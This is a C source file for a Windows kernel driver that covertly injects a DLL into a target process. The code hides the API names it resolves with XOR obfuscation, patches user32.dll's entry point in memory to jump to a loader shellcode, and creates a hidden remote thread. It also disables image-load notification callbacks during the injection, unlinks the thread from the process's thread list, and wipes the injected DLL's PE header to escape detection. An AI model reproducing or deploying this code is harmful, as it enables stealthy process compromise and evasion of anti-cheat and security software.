#include"Inject.h"
#include<ntimage.h>
#include"MemLoadDll.h"
#include"Memory.h"

EXTERN_C PVOID PsGetProcessPeb(PEPROCESS Process);

EXTERN_C PVOID PsGetProcessWow64Process(PEPROCESS Process);

typedef NTSTATUS(NTAPI* _ZwCreateThreadExProc)(
	OUT PHANDLE ThreadHandle,       //返回线程句柄
	IN ACCESS_MASK DesiredAccess,  //返回权限
	IN POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL,  // NULL 线程没有名字的
	IN HANDLE ProcessHandle,       //当前进程,本进程 -1
	IN PVOID StartRoutine,			//线程的回调  
	IN PVOID StartContext,			//回调参数 ,线程回调上下文
	IN ULONG CreateThreadFlags,		//标志  : 例如 挂起 
	IN SIZE_T ZeroBits OPTIONAL,    //入口  不重要可以写0
	IN SIZE_T StackSize OPTIONAL,   //线程在创建的时候 堆的内存有多大
	IN SIZE_T MaximumStackSize OPTIONAL,//线程在创建的时候,最大的堆的内存有多大
	IN PVOID AttributeList           //不重要写NULL
	);

//=============================================================================

typedef struct _PEB_LDR_DATA64
{
	ULONG Length;
	UCHAR Initialized;
	PVOID SsHandle;
	LIST_ENTRY InLoadOrderModuleList;
	LIST_ENTRY InMemoryOrderModuleList;
	LIST_ENTRY InInitializationOrderModuleList;
	PVOID EntryInProgress;
	UCHAR ShutdownInProgress;
	PVOID ShutdownThreadId;
}PEB_LDR_DATA64, * PPEB_LDR_DATA64;

typedef struct _PEB64
{
	UCHAR InheritedAddressSpace;
	UCHAR ReadImageFileExecOptions;
	UCHAR BeingDebugged;
	union
	{
		UCHAR BitField;
		struct
		{
			UCHAR ImageUsesLargePages : 1;
			UCHAR IsProtectedProcess : 1;
			UCHAR IsImageDynamicallyRelocated : 1;
			UCHAR SkipPatchingUser32Forwarders : 1;
			UCHAR IsPackagedProcess : 1;
			UCHAR IsAppContainer : 1;
			UCHAR IsProtectedProcessLight : 1;
			UCHAR IsLongPathAwareProcess : 1;
		};
	}u1;
	UCHAR Padding0[4];
	PVOID Mutant;
	PVOID ImageBaseAddress;
	PEB_LDR_DATA64* Ldr;
}PEB64, * PPEB64;

typedef struct _LDR_DATA_TABLE_ENTRY
{
	LIST_ENTRY InLoadOrderLinks;
	LIST_ENTRY InMemoryOrderLinks;
	LIST_ENTRY InInitializationOrderLinks;
	PVOID DllBase;
	PVOID EntryPoint;
	ULONG SizeOfImage;
	UNICODE_STRING FullDllName;
	UNICODE_STRING BaseDllName;

}LDR_DATA_TABLE_ENTRY, * PLDR_DATA_TABLE_ENTRY;


#pragma pack(4)
typedef struct _PEB32
{
	UCHAR InheritedAddressSpace;                                            //0x0
	UCHAR ReadImageFileExecOptions;                                         //0x1
	UCHAR BeingDebugged;                                                    //0x2
	UCHAR BitField;                                                     //0x3
	ULONG Mutant;                                                           //0x4
	ULONG ImageBaseAddress;                                                 //0x8
	ULONG Ldr;                                                              //0xc
}PEB32, * PPEB32;

typedef struct _PEB_LDR_DATA32
{
	ULONG Length;
	UCHAR Initialized;
	ULONG SsHandle;
	LIST_ENTRY32 InLoadOrderModuleList;
	LIST_ENTRY32 InMemoryOrderModuleList;
	LIST_ENTRY32 InInitializationOrderModuleList;
	ULONG EntryInProgress;
	UCHAR ShutdownInProgress;
	ULONG ShutdownThreadId;
}PEB_LDR_DATA32, * PPEB_LDR_DATA32;


typedef struct _LDR_DATA_TABLE_ENTRY32
{
	LIST_ENTRY32 InLoadOrderLinks;                                    //0x0
	LIST_ENTRY32 InMemoryOrderLinks;                                  //0x10
	LIST_ENTRY32 InInitializationOrderLinks;                          //0x20
	ULONG DllBase;                                                          //0x30
	ULONG EntryPoint;                                                       //0x38
	ULONG SizeOfImage;                                                      //0x40
	UNICODE_STRING32 FullDllName;                                     //0x48
	UNICODE_STRING32 BaseDllName;                                     //0x58
}LDR_DATA_TABLE_ENTRY32, * PLDR_DATA_TABLE_ENTRY32;
#pragma pop(0)
//=============================================================================

NTSTATUS MmCopyVirtualMemory(
	IN PEPROCESS FromProcess,
	IN CONST VOID* FromAddress,
	IN PEPROCESS ToProcess,
	OUT PVOID ToAddress,
	IN SIZE_T BufferSize,
	IN KPROCESSOR_MODE PreviousMode,
	OUT PSIZE_T NumberOfBytesCopied
);


NTSTATUS AnsiToUnicode(char* ansiStr, PUNICODE_STRING unStr)
{
	ANSI_STRING astr = { 0 };
	RtlInitAnsiString(&astr, ansiStr);

	return RtlAnsiStringToUnicodeString(unStr, &astr, TRUE);
}



//获取imagesize
SIZE_T GetImageSize(char* image)
{
	PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)image;

	PIMAGE_NT_HEADERS pNts = (PIMAGE_NT_HEADERS)(image + pDos->e_lfanew);

	SIZE_T imageSize = pNts->OptionalHeader.SizeOfImage;

	return imageSize;
}


//获取ZwCreateThreadEx线程函数
ULONG64 GetZwCreateThreadExFunc()
{

	wchar_t wa_ZwCreateSymbolicLinkObject[] = { 0xE3B9, 0xE394, 0xE3A0, 0xE391, 0xE386, 0xE382, 0xE397, 0xE386, 0xE3B0, 0xE39A, 0xE38E, 0xE381, 0xE38C, 0xE38F, 0xE38A, 0xE380, 0xE3AF, 0xE38A, 0xE38D, 0xE388, 0xE3AC, 0xE381, 0xE389, 0xE386, 0xE380, 0xE397, 0xE3E3, 0xE3E3 };

	for (int i = 0; i < 28; i++)
	{
		wa_ZwCreateSymbolicLinkObject[i] ^= 0x6D6D;
		wa_ZwCreateSymbolicLinkObject[i] ^= 0x8E8E;
	};

	UNICODE_STRING unFuncNameZwCreateSymbolicLinkObject = { 0 };
	RtlInitUnicodeString(&unFuncNameZwCreateSymbolicLinkObject, wa_ZwCreateSymbolicLinkObject);
	PUCHAR funcZwCreateSymbolicLinkObject = (PUCHAR)MmGetSystemRoutineAddress(&unFuncNameZwCreateSymbolicLinkObject);


	//找到这个函数之后
	funcZwCreateSymbolicLinkObject += 0x15;

	_ZwCreateThreadExProc func = NULL;

	for (int i = 0; i < 30; i++)
	{
		if (funcZwCreateSymbolicLinkObject[i] == 0x48
			&& funcZwCreateSymbolicLinkObject[i + 1] == 0x8b
			&& funcZwCreateSymbolicLinkObject[i + 2] == 0xc4
			)
		{
			funcZwCreateSymbolicLinkObject += i;
			func = (_ZwCreateThreadExProc)funcZwCreateSymbolicLinkObject;
			break;
		}
	}

	return (ULONG64)func; //没有找到返回空
}


NTSTATUS NTAPI  ZwCreateThreadEx(
	OUT PHANDLE ThreadHandle,
	IN ACCESS_MASK DesiredAccess,
	IN POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL,
	IN HANDLE ProcessHandle,
	IN PVOID StartRoutine,
	IN PVOID StartContext,
	IN ULONG CreateThreadFlags,
	IN SIZE_T ZeroBits OPTIONAL,
	IN SIZE_T StackSize OPTIONAL,
	IN SIZE_T MaximumStackSize OPTIONAL,
	IN PVOID AttributeList
)
{
	static _ZwCreateThreadExProc _ZwCreateThreadExFunc = NULL;

	if (!_ZwCreateThreadExFunc)
	{
		_ZwCreateThreadExFunc = (_ZwCreateThreadExProc)GetZwCreateThreadExFunc();
	}

	if (_ZwCreateThreadExFunc)
	{
		return _ZwCreateThreadExFunc(ThreadHandle, DesiredAccess,
			ObjectAttributes, ProcessHandle,
			StartRoutine, StartContext,
			CreateThreadFlags, ZeroBits,
			StackSize, MaximumStackSize,
			AttributeList);
	}

	return STATUS_NOT_IMPLEMENTED;
}

NTSTATUS CreateRemoteThreadEx(PETHREAD* pThread, IN PVOID StartRoutine, IN PVOID StartContext)
{
	HANDLE hThread = NULL;
	NTSTATUS st = ZwCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL,
		NtCurrentProcess(), StartRoutine, StartContext, 0, 0, 0x100000, 0x200000, NULL);

	if (NT_SUCCESS(st))
	{
		if (pThread)
		{
			PETHREAD tObj = NULL;

			NTSTATUS tu = ObReferenceObjectByHandle(hThread, THREAD_ALL_ACCESS, *PsThreadType, KernelMode, &tObj, NULL);

			if (NT_SUCCESS(tu))
			{
				*pThread = tObj;
			}
		}

		ZwClose(hThread);
	}

	return st;
}



//获取到 LoadLibraryExW
ULONG64 ExportTableFuncByName(char* pData, char* funcName)
{
	PIMAGE_DOS_HEADER pHead = (PIMAGE_DOS_HEADER)pData;
	PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(pData + pHead->e_lfanew);
	int numberRvaAndSize = pNt->OptionalHeader.NumberOfRvaAndSizes;
	PIMAGE_DATA_DIRECTORY pDir = (PIMAGE_DATA_DIRECTORY)&pNt->OptionalHeader.DataDirectory[0];

	PIMAGE_EXPORT_DIRECTORY pExport = (PIMAGE_EXPORT_DIRECTORY)(pData + pDir->VirtualAddress);

	ULONG64 funcAddr = 0;
	for (int i = 0; i < pExport->NumberOfNames; i++)
	{
		int* funcAddress = pData + pExport->AddressOfFunctions;
		int* names = pData + pExport->AddressOfNames;
		short* fh = pData + pExport->AddressOfNameOrdinals;
		int index = -1;
		char* name = pData + names[i];

		if (strcmp(name, funcName) == 0)
		{
			index = fh[i];
		}



		if (index != -1)
		{
			funcAddr = pData + funcAddress[index];
			break;
		}


	}

	if (!funcAddr)
	{
		KdPrint(("没有找到函数%s\r\n", funcName));

	}
	else
	{
		KdPrint(("找到函数%s addr %p\r\n", funcName, funcAddr));
	}


	return funcAddr;
}

ULONG64 FK_GetModuleHandle64(PEPROCESS Process, char* moduleName, PSIZE_T moduleSize)
{

	ULONG64 imageBase = 0;

	ULONG64 imageSize = 0;

	PEB64* peb = PsGetProcessPeb(Process);

	if (!peb) return 0;

	SIZE_T retSize = 0;

	MmCopyVirtualMemory(Process, peb, Process, peb, 4, UserMode, &retSize);

	KAPC_STATE kApcState = { 0 };

	KeStackAttachProcess(Process, &kApcState);
	do
	{
		if (MmIsAddressValid(peb))
		{
			MmCopyVirtualMemory(Process, peb->Ldr, Process, peb->Ldr, 8, UserMode, &retSize);

			if (MmIsAddressValid(peb->Ldr))
			{
				PLDR_DATA_TABLE_ENTRY ldr = (PLDR_DATA_TABLE_ENTRY)&peb->Ldr->InLoadOrderModuleList;

				PLDR_DATA_TABLE_ENTRY next = (PLDR_DATA_TABLE_ENTRY)ldr->InLoadOrderLinks.Flink;

				UNICODE_STRING unModuleName;

				NTSTATUS st = AnsiToUnicode(moduleName, &unModuleName);

				if (!NT_SUCCESS(st))
				{
					break;
				}

				while (ldr != next)
				{

					if (RtlCompareUnicodeString(&next->BaseDllName, &unModuleName, TRUE) == 0)
					{
						imageBase = next->DllBase;
						imageSize = next->SizeOfImage;
						break;
					}

					next = (PLDR_DATA_TABLE_ENTRY)next->InLoadOrderLinks.Flink;
				}

				RtlFreeUnicodeString(&unModuleName);
			}


		}


	} while (0);

	KeUnstackDetachProcess(&kApcState);


	if (imageSize && moduleSize)
	{
		*moduleSize = imageSize;
	}

	return imageBase;
}

ULONG64 FK_GetModuleHandle86(PEPROCESS Process, char* moduleName, PSIZE_T moduleSize)
{
	ULONG64 imageBase = 0;

	ULONG64 imageSize = 0;

	PEB32* peb = PsGetProcessWow64Process(Process);

	if (!peb) return 0;

	SIZE_T retSize = 0;

	MmCopyVirtualMemory(Process, peb, Process, peb, 4, UserMode, &retSize);

	KAPC_STATE kApcState = { 0 };

	KeStackAttachProcess(Process, &kApcState);
	do
	{
		if (MmIsAddressValid(peb))
		{
			PPEB_LDR_DATA32 ldr = ULongToPtr(peb->Ldr);
			MmCopyVirtualMemory(Process, ldr, Process, ldr, 8, UserMode, &retSize);

			if (MmIsAddressValid(ULongToPtr(peb->Ldr)))
			{

				PLDR_DATA_TABLE_ENTRY32 pList = (PLDR_DATA_TABLE_ENTRY32)&ldr->InLoadOrderModuleList;

				PLDR_DATA_TABLE_ENTRY32 next = (PLDR_DATA_TABLE_ENTRY32)pList->InLoadOrderLinks.Flink;

				UNICODE_STRING unModuleName;

				NTSTATUS st = AnsiToUnicode(moduleName, &unModuleName);

				if (!NT_SUCCESS(st))
				{
					break;
				}

				while (pList != next)
				{
					UNICODE_STRING unNameBase = { 0 };
					RtlInitUnicodeString(&unNameBase, next->BaseDllName.Buffer);
					;
					if (RtlCompareUnicodeString(&unNameBase, &unModuleName, TRUE) == 0)
					{
						imageBase = next->DllBase;
						imageSize = next->SizeOfImage;
						break;
					}

					next = (PLDR_DATA_TABLE_ENTRY32)next->InLoadOrderLinks.Flink;
				}

				RtlFreeUnicodeString(&unModuleName);
			}


		}


	} while (0);

	KeUnstackDetachProcess(&kApcState);


	if (imageSize && moduleSize)
	{
		*moduleSize = imageSize;
	}

	return imageBase;
}


ULONG64 FK_GetModuleHandle(HANDLE pid, char* moduleName, PSIZE_T moduleSize)
{

	PEPROCESS Process = NULL;


	NTSTATUS st = PsLookupProcessByProcessId(pid, &Process);

	if (!NT_SUCCESS(st))
	{
		return 0;
	}


	if (PsGetProcessExitStatus(Process) != STATUS_PENDING)
	{
		ObDereferenceObject(Process);

		return 0;
	}

	ObDereferenceObject(Process);

	//判断x64 还是x86
	PVOID peb32 = PsGetProcessWow64Process(Process);

	if (peb32)
	{
		//x86
		return FK_GetModuleHandle86(Process, moduleName, moduleSize);
	}


	return FK_GetModuleHandle64(Process, moduleName, moduleSize);

}


ULONG SetCallbackNotfiy(ULONG mask)
{
	//找高版本
	wchar_t wa_PsSetLoadImageNotifyRoutineEx[] = { 0xE3B3, 0xE390, 0xE3B0, 0xE386, 0xE397, 0xE3AF, 0xE38C, 0xE382, 0xE387, 0xE3AA, 0xE38E, 0xE382, 0xE384, 0xE386, 0xE3AD, 0xE38C, 0xE397, 0xE38A, 0xE385, 0xE39A, 0xE3B1, 0xE38C, 0xE396, 0xE397, 0xE38A, 0xE38D, 0xE386, 0xE3A6, 0xE39B, 0xE3E3, 0xE3E3 };

	for (int i = 0; i < 31; i++)
	{
		wa_PsSetLoadImageNotifyRoutineEx[i] ^= 0x6D6D;
		wa_PsSetLoadImageNotifyRoutineEx[i] ^= 0x8E8E;
	};

	UNICODE_STRING unFuncNamePsSetLoadImageNotifyRoutineEx = { 0 };
	RtlInitUnicodeString(&unFuncNamePsSetLoadImageNotifyRoutineEx, wa_PsSetLoadImageNotifyRoutineEx);
	PUCHAR funcPsSetLoadImageNotifyRoutineEx = (PUCHAR)MmGetSystemRoutineAddress(&unFuncNamePsSetLoadImageNotifyRoutineEx);

	if (!funcPsSetLoadImageNotifyRoutineEx)
	{
		wchar_t wa_PsSetLoadImageNotifyRoutine[] = { 0xE3B3, 0xE390, 0xE3B0, 0xE386, 0xE397, 0xE3AF, 0xE38C, 0xE382, 0xE387, 0xE3AA, 0xE38E, 0xE382, 0xE384, 0xE386, 0xE3AD, 0xE38C, 0xE397, 0xE38A, 0xE385, 0xE39A, 0xE3B1, 0xE38C, 0xE396, 0xE397, 0xE38A, 0xE38D, 0xE386, 0xE3E3, 0xE3E3 };

		for (int i = 0; i < 29; i++)
		{
			wa_PsSetLoadImageNotifyRoutine[i] ^= 0x6D6D;
			wa_PsSetLoadImageNotifyRoutine[i] ^= 0x8E8E;
		};

		UNICODE_STRING unFuncNamePsSetLoadImageNotifyRoutine = { 0 };
		RtlInitUnicodeString(&unFuncNamePsSetLoadImageNotifyRoutine, wa_PsSetLoadImageNotifyRoutine);
		funcPsSetLoadImageNotifyRoutineEx = (PUCHAR)MmGetSystemRoutineAddress(&unFuncNamePsSetLoadImageNotifyRoutine);

	}


	if (!funcPsSetLoadImageNotifyRoutineEx) return 0;

	ULONG64 findAddress = 0;

	for (int i = 0; i < 150; i++)
	{
		if (funcPsSetLoadImageNotifyRoutineEx[i] == 0x8b
			&& funcPsSetLoadImageNotifyRoutineEx[i + 1] == 0x05 && funcPsSetLoadImageNotifyRoutineEx[i + 6] == 0xA8
			)
		{
			LONG64 offset = *(PLONG)(funcPsSetLoadImageNotifyRoutineEx + i + 2);

			findAddress = (ULONG64)(offset + (funcPsSetLoadImageNotifyRoutineEx + i + 6));
			break;
		}
	}


	if (!findAddress)
	{
		return 0;
	}

	ULONG retValue = 0;

	if (MmIsAddressValid(findAddress))
	{
		retValue = *(PULONG)findAddress;
		*(PULONG)findAddress = mask;
	}

	return retValue;

}

ULONG GetThreadListOffset()
{
	RTL_OSVERSIONINFOW version;
	RtlGetVersion(&version);

	wchar_t wa_PsGetThreadId[] = { 0xE3B3, 0xE390, 0xE3A4, 0xE386, 0xE397, 0xE3B7, 0xE38B, 0xE391, 0xE386, 0xE382, 0xE387, 0xE3AA, 0xE387, 0xE3E3, 0xE3E3 };

	for (int i = 0; i < 15; i++)
	{
		wa_PsGetThreadId[i] ^= 0x6D6D;
		wa_PsGetThreadId[i] ^= 0x8E8E;
	};

	UNICODE_STRING unFuncNamePsGetThreadId = { 0 };
	RtlInitUnicodeString(&unFuncNamePsGetThreadId, wa_PsGetThreadId);
	PUCHAR funcPsGetThreadId = (PUCHAR)MmGetSystemRoutineAddress(&unFuncNamePsGetThreadId);

	ULONG tidOffset = *(PULONG)(funcPsGetThreadId + 3);

	ULONG offset = 0;

	if (version.dwBuildNumber == 7601 || version.dwBuildNumber == 7600)
	{
		offset = tidOffset + 0x68;
	}
	else if (version.dwBuildNumber <= 15063)
	{
		offset = tidOffset + 0x60;
	}
	else
	{
		offset = tidOffset + 0x68;
	}

	return offset;
}



NTSTATUS Inject(ULONG64 pid, char* file, SIZE_T fileSize)
{
	PEPROCESS Process = NULL;
	NTSTATUS st = PsLookupProcessByProcessId(pid, &Process);

	if (!NT_SUCCESS(st))
	{
		return st;
	}

	st = PsGetProcessExitStatus(Process);

	if (st != STATUS_PENDING)
	{
		ObDereferenceObject(Process);

		return STATUS_UNSUCCESSFUL;
	}

	

	PUCHAR MykfileDll = ExAllocatePool(PagedPool, fileSize);

	RtlCopyMemory(MykfileDll, file, fileSize);

	SIZE_T imageSize = GetImageSize(MykfileDll);

	KAPC_STATE kApcState = { 0 };

	KeStackAttachProcess(Process, &kApcState);
	do
	{
		PUCHAR shellcode = NULL;
		SIZE_T shellcodeSize = sizeof(MyLoadShellcode_x64);
		SIZE_T targetfileSize = fileSize;
		PUCHAR targetFileBase = NULL;

		
		st = ZwAllocateVirtualMemory(NtCurrentProcess(), &shellcode, 0, &shellcodeSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

		if (!NT_SUCCESS(st)) break;
		st = ZwAllocateVirtualMemory(NtCurrentProcess(), &targetFileBase, 0, &targetfileSize, MEM_COMMIT, PAGE_READWRITE);

		if (!NT_SUCCESS(st))
		{
			ZwFreeVirtualMemory(NtCurrentProcess(), &shellcode, &shellcodeSize, MEM_RELEASE);
			break;
		}
		RtlCopyMemory(shellcode, MyLoadShellcode_x64, sizeof(MyLoadShellcode_x64));
		RtlCopyMemory(targetFileBase, MykfileDll, fileSize);

		PETHREAD thread = NULL;


		

		PVOID dllBase = NULL;

		st = ZwAllocateVirtualMemory(NtCurrentProcess(), &dllBase, 0, &imageSize, MEM_COMMIT, PAGE_READWRITE);

		if (!NT_SUCCESS(st))
		{
			ZwFreeVirtualMemory(NtCurrentProcess(), &targetFileBase, &targetfileSize, MEM_RELEASE);
			ZwFreeVirtualMemory(NtCurrentProcess(), &shellcode, &shellcodeSize, MEM_RELEASE);
			break;
		}
		
		memset(dllBase,0,imageSize);
		shellcode[0x50f] = 0x90;
		shellcode[0x510] = 0x48;
		shellcode[0x511] = 0xb8;
		*(PULONG64)&shellcode[0x512] = (ULONG64)dllBase;

		SetExecutePage(dllBase,imageSize);//设置页 改属性
		DbgPrintEx(77, 0, "[db]:%llx\r\n", dllBase);

		ULONG_PTR user32Module = FK_GetModuleHandle(pid, "user32.dll", NULL);

		if (!user32Module)
		{
		_exit:
			ZwFreeVirtualMemory(NtCurrentProcess(), &targetFileBase, &targetfileSize, MEM_RELEASE);
			ZwFreeVirtualMemory(NtCurrentProcess(), &shellcode, &shellcodeSize, MEM_RELEASE);
			ZwFreeVirtualMemory(NtCurrentProcess(), &dllBase, &imageSize, MEM_RELEASE);
			break;
		}

		//DbgBreakPoint();
		PIMAGE_DOS_HEADER pDosUser32 = (PIMAGE_DOS_HEADER)user32Module;

		PIMAGE_NT_HEADERS pNtUser32 = (PIMAGE_NT_HEADERS)(user32Module + pDosUser32->e_lfanew);

		ULONG_PTR AddressOfEntryPoint = user32Module + pNtUser32->OptionalHeader.AddressOfEntryPoint;

		PHYSICAL_ADDRESS epPys = MmGetPhysicalAddress(AddressOfEntryPoint);

		PUCHAR mem = MmMapIoSpace(epPys, 0x40, MmCached);

		if (!mem)
		{
			goto _exit;
		}

		char bufcode[40] = { 0 };

		RtlCopyMemory(bufcode, mem, 40);

		char jmpcode[14] = { 0xff,0x25,0,0,0,0,0 };
		*(PULONG64)&jmpcode[6] = (ULONG64)shellcode;

		RtlCopyMemory(mem, jmpcode, 14);

		//清空回调通知
		ULONG mask = SetCallbackNotfiy(0);

		//线程
		st = CreateRemoteThreadEx(&thread, AddressOfEntryPoint, targetFileBase);

		if (NT_SUCCESS(st))
		{

			ULONG threadListOffset = GetThreadListOffset();

			PLIST_ENTRY list = (PLIST_ENTRY)((PUCHAR)thread + threadListOffset);

			RemoveEntryList(list);

			InitializeListHead(list);

			KeWaitForSingleObject(thread, Executive, KernelMode, FALSE, NULL);

			ZwFreeVirtualMemory(NtCurrentProcess(), &shellcode, &shellcodeSize, MEM_RELEASE);

			ZwFreeVirtualMemory(NtCurrentProcess(), &targetFileBase, &targetfileSize, MEM_RELEASE);

			//清空PE头
			memset(dllBase, 0, PAGE_SIZE);
		}
		SetCallbackNotfiy(mask);
		RtlCopyMemory(mem, bufcode, 40);

		MmUnmapIoSpace(mem, 0x40);
	} while (0);

	KeUnstackDetachProcess(&kApcState);

	ExFreePool(MykfileDll);

	ObDereferenceObject(Process);

	return st;
}

